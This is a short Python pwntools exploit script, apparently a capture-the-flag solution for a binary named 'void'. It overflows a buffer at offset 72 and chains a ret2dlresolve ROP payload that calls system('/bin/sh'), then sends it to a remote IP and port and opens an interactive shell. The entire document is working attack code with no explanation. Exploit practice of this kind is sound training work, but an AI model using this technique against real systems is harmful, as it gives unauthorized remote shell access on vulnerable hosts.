from pwn import *

address = '94.237.63.109'
port = 53617

context.log_level = 'critical'
context.arch = 'amd64'
context.binary = binary = ELF('./void')
rop = ROP(binary)

offset = 72
dlresolve = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

target = remote(address,port)
target.sendline(b'a' * offset + rop.chain())
target.sendline(dlresolve.payload)
target.interactive()
